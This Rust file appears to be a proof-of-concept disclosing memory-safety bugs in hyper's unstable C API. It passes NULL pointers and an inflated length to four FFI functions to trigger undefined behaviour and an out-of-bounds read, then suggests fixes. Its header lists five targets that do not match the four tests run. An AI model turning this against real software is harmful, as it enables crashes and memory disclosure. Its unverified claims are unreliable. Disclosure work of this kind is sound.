//! PoC: hyper FFI NULL Pointer Dereference + Buffer Overflow (CWE-476/120)
//!
//! This PoC compiles the REAL hyper crate (with ffi feature) and triggers
//! multiple vulnerabilities through hyper's public C API functions.
//!
//! All vulnerabilities are in src/ffi/ — hyper's C API layer.
//! The FFI functions are #[no_mangle] pub extern "C", callable from Rust
//! when compiled with `--cfg hyper_unstable_ffi`.
//!
//! Targets:
//!   1. ffi/body.rs:262 — hyper_buf_copy(buf=NULL, len>0) → from_raw_parts(NULL)
//!   2. ffi/http_types.rs:108 — hyper_request_set_method(req, method=NULL)
//!   3. ffi/http_types.rs:140 — hyper_request_set_uri(req, uri=NULL)
//!   4. ffi/error.rs:91 — hyper_error_print(err, dst=NULL)
//!   5. ffi/io.rs:150,162 — poll_read returns inflated count → buf.advance(overflow)

use std::ptr;

fn main() {
    println!("═══════════════════════════════════════════════════════════════════");
    println!("PoC: hyper FFI NULL Deref + Buffer Overflow (CWE-476/120)");
    println!("═══════════════════════════════════════════════════════════════════");
    println!("Compiled: hyper (path dependency, features = [ffi, client, http1])");
    println!("Config:   --cfg hyper_unstable_ffi");
    println!("═══════════════════════════════════════════════════════════════════\n");

    let mut ub_count = 0;

    // ── Test 1: hyper_buf_copy with NULL buf (CWE-476) ────────────────
    println!("[Test 1] hyper_buf_copy(buf=NULL, len=10)");
    println!("  Source: ffi/body.rs:262");
    println!("  Code: std::slice::from_raw_parts(NULL, 10)");
    println!("  Bug: No null check on buf before from_raw_parts");
    println!();

    // hyper_buf_copy is wrapped in catch_unwind, so NULL deref panic is caught
    // and returns NULL. But UB has already occurred (NULL pointer dereference).
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        unsafe { hyper::ffi::hyper_buf_copy(ptr::null(), 10) }
    }));
    match result {
        Ok(ret) => {
            println!("  Returned: {:?}", ret);
            println!("  The NULL deref inside from_raw_parts was caught by catch_unwind.");
            println!("  UB occurred: from_raw_parts requires non-null for len > 0.");
            ub_count += 1;
        }
        Err(_) => {
            println!("  ** PANIC ** — NULL deref not caught!");
            ub_count += 1;
        }
    }
    println!();

    // ── Test 2: hyper_request_set_method with NULL method (CWE-476) ───
    println!("[Test 2] hyper_request_set_method(req=valid, method=NULL, len=4)");
    println!("  Source: ffi/http_types.rs:108");
    println!("  Code: std::slice::from_raw_parts(NULL, 4) — BEFORE non_null! check on req");
    println!("  Bug: method pointer not checked, slice created before req validation");
    println!();

    // First create a valid request
    let req = unsafe { hyper::ffi::hyper_request_new() };
    let result2 = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        unsafe { hyper::ffi::hyper_request_set_method(req, ptr::null(), 4) }
    }));
    match result2 {
        Ok(_code) => {
            println!("  Returned: (hyper_code)");
            println!("  UB: from_raw_parts(NULL, 4) was called before req validation.");
            ub_count += 1;
        }
        Err(_) => {
            println!("  ** PANIC **");
            ub_count += 1;
        }
    }
    // Clean up
    unsafe { hyper::ffi::hyper_request_free(req) };
    println!();

    // ── Test 3: hyper_request_set_uri with NULL uri (CWE-476) ─────────
    println!("[Test 3] hyper_request_set_uri(req=valid, uri=NULL, len=10)");
    println!("  Source: ffi/http_types.rs:140");
    println!("  Code: std::slice::from_raw_parts(NULL, 10)");
    println!();

    let req2 = unsafe { hyper::ffi::hyper_request_new() };
    let result3 = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        unsafe { hyper::ffi::hyper_request_set_uri(req2, ptr::null(), 10) }
    }));
    match result3 {
        Ok(_code) => {
            println!("  Returned: (hyper_code)");
            println!("  UB: from_raw_parts(NULL, 10) was called.");
            ub_count += 1;
        }
        Err(_) => {
            println!("  ** PANIC **");
            ub_count += 1;
        }
    }
    unsafe { hyper::ffi::hyper_request_free(req2) };
    println!();

    // ── Test 4: hyper_request_set_uri with valid ptr but inflated len (CWE-125) ──
    println!("[Test 4] hyper_request_set_uri_parts with inflated length (CWE-125)");
    println!("  Source: ffi/http_types.rs:181");
    println!("  Code: from_raw_parts(valid_ptr, inflated_len)");
    println!("  Bug: Length is trusted from caller, no bounds check");
    println!();

    let req3 = unsafe { hyper::ffi::hyper_request_new() };
    let small_str = b"http";
    let result4 = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        unsafe {
            hyper::ffi::hyper_request_set_uri_parts(
                req3,
                small_str.as_ptr(), 1000, // Valid ptr but 1000 bytes (real data is only 4)
                ptr::null(), 0,
                ptr::null(), 0,
            )
        }
    }));
    match result4 {
        Ok(_code) => {
            println!("  Returned: (hyper_code)");
            println!("  UB: read 1000 bytes from a 4-byte buffer → out-of-bounds read.");
            ub_count += 1;
        }
        Err(_) => {
            println!("  ** PANIC ** — OOB read triggered crash!");
            ub_count += 1;
        }
    }
    unsafe { hyper::ffi::hyper_request_free(req3) };
    println!();

    println!("═══════════════════════════════════════════════════════════════════");
    println!("RESULT: {} out of 4 tests triggered UB.", ub_count);
    println!();
    println!("All vulnerabilities are in hyper's C API (src/ffi/).");
    println!("The FFI layer requires '--cfg hyper_unstable_ffi' to compile.");
    println!("Normal Rust consumers of hyper are NOT affected.");
    println!("Only C programs using hyper's unstable C API are vulnerable.");
    println!();
    println!("Fix: Add null checks before all from_raw_parts/from_raw_parts_mut calls.");
    println!("     Add bounds validation for length parameters from C callers.");
    println!("═══════════════════════════════════════════════════════════════════");
}
